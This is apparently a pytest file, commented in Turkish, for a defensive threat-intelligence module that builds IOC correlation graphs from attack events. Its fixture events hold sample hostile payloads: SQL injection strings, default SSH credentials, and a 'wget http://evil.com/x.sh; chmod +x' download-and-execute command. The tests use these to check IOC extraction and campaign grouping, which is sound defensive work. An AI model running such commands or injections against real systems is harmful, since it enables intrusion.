"""Faz 33 - IOC korelasyon grafi testleri."""
from arachne.intel import correlation_graph as cg


def _events():
    return [
        {"id": 1, "timestamp": "2026-08-15 10:00:00", "source_ip": "203.0.113.5",
         "service": "http", "event_type": "request",
         "payload": "' OR 1=1 -- kaynak 8.8.8.8", "dest_port": 80},
        {"id": 2, "timestamp": "2026-08-15 10:00:30", "source_ip": "203.0.113.5",
         "service": "ssh", "event_type": "login", "payload": "admin admin",
         "dest_port": 22},
        {"id": 3, "timestamp": "2026-08-15 10:01:00", "source_ip": "203.0.113.9",
         "service": "http", "event_type": "request",
         "payload": "sqlmap UNION SELECT", "dest_port": 80},
        {"id": 4, "timestamp": "2026-08-15 10:02:00", "source_ip": "198.51.100.7",
         "service": "ftp", "event_type": "connect",
         "payload": "wget http://evil.com/x.sh; chmod +x", "dest_port": 21},
    ]


def test_build_graph_has_all_node_types():
    graph = cg.build_correlation_graph(_events())
    types = graph["stats"]["by_type"]
    for expected in ("attacker", "event", "target", "ioc"):
        assert types.get(expected, 0) > 0


def test_deterministic_node_ids():
    graph = cg.build_correlation_graph(_events())
    ids = {n["id"] for n in graph["nodes"]}
    assert "attacker:203.0.113.5" in ids
    assert "target:ssh" in ids
    assert "event:1" in ids


def test_attacker_nodes_are_distinct_ips():
    graph = cg.build_correlation_graph(_events())
    attackers = {n["meta"]["ip"] for n in graph["nodes"]
                 if n["type"] == "attacker"}
    assert attackers == {"203.0.113.5", "203.0.113.9", "198.51.100.7"}


def test_target_nodes_are_distinct_services():
    graph = cg.build_correlation_graph(_events())
    targets = {n["meta"]["service"] for n in graph["nodes"]
               if n["type"] == "target"}
    assert targets == {"http", "ssh", "ftp"}


def test_ioc_extraction_creates_ioc_nodes_and_edges():
    graph = cg.build_correlation_graph(_events())
    ioc_ids = {n["id"] for n in graph["nodes"] if n["type"] == "ioc"}
    # evil.com alan adi ve 8.8.8.8 IP'si payload'lardan cikarilmali.
    assert "ioc:domain:evil.com" in ioc_ids
    assert "ioc:ip:8.8.8.8" in ioc_ids
    # IOC -> olay kenari (observed-in) olmali.
    assert any(e["rel"] == "observed-in" for e in graph["edges"])


def test_technique_nodes_from_payload():
    graph = cg.build_correlation_graph(_events())
    tech = {n["meta"]["technique_id"] for n in graph["nodes"]
            if n["type"] == "technique"}
    # SQL Injection -> T1190 beklenir.
    assert "T1190" in tech


def test_campaign_groups_shared_subnet():
    graph = cg.build_correlation_graph(_events())
    campaigns = [n for n in graph["nodes"] if n["type"] == "campaign"]
    assert len(campaigns) == 1
    members = campaigns[0]["meta"]["member_ips"]
    # 203.0.113.5 ve 203.0.113.9 ayni /24'te -> tek kampanya, 198.* haric.
    assert members == ["203.0.113.5", "203.0.113.9"]
    assert "198.51.100.7" not in members


def test_alerts_enrich_attacker_meta():
    alerts = [{"source_ip": "203.0.113.5", "score": 80, "severity": "high",
               "reasons": ["sqli"]}]
    graph = cg.build_correlation_graph(_events(), alerts=alerts)
    node = next(n for n in graph["nodes"] if n["id"] == "attacker:203.0.113.5")
    assert node["meta"]["severity"] == "high"
    assert node["meta"]["score"] == 80


def test_node_neighbors_incoming_outgoing():
    graph = cg.build_correlation_graph(_events())
    nb = cg.node_neighbors(graph, "attacker:203.0.113.5")
    assert nb["node"]["id"] == "attacker:203.0.113.5"
    # Olaydan gelen 'attributed-to' kenari incoming olmali.
    assert any(e["rel"] == "attributed-to" for e in nb["incoming"])
    # Hedefe/kampanyaya giden kenarlar outgoing olmali.
    rels = {e["rel"] for e in nb["outgoing"]}
    assert "targets" in rels and "part-of" in rels


def test_node_neighbors_unknown_id():
    graph = cg.build_correlation_graph(_events())
    nb = cg.node_neighbors(graph, "attacker:10.10.10.10")
    assert nb["node"] is None
    assert nb["incoming"] == [] and nb["outgoing"] == []


def test_graph_summary_counts_and_top_attackers():
    graph = cg.build_correlation_graph(_events())
    summary = cg.graph_summary(graph)
    assert summary["node_count"] == len(graph["nodes"])
    assert summary["edge_count"] == len(graph["edges"])
    # 203.0.113.5 iki olayla en aktif saldirgan.
    assert summary["top_attackers"][0]["ip"] == "203.0.113.5"
    assert summary["top_attackers"][0]["event_count"] == 2
    assert "kampanya" in summary["summary_tr"]


def test_empty_events_produces_empty_graph():
    graph = cg.build_correlation_graph([])
    assert graph["nodes"] == []
    assert graph["edges"] == []
    assert graph["stats"]["node_count"] == 0


def test_custom_extract_and_technique_fns_are_used():
    # Enjekte edilen fonksiyonlar cagrilmali (deterministik/test edilebilir).
    graph = cg.build_correlation_graph(
        _events(),
        extract_fn=lambda text: {"domains": ["injected.example"]},
        technique_fn=lambda payload: ["T9999"],
    )
    ioc_ids = {n["id"] for n in graph["nodes"] if n["type"] == "ioc"}
    tech_ids = {n["meta"]["technique_id"] for n in graph["nodes"]
                if n["type"] == "technique"}
    assert "ioc:domain:injected.example" in ioc_ids
    assert tech_ids == {"T9999"}
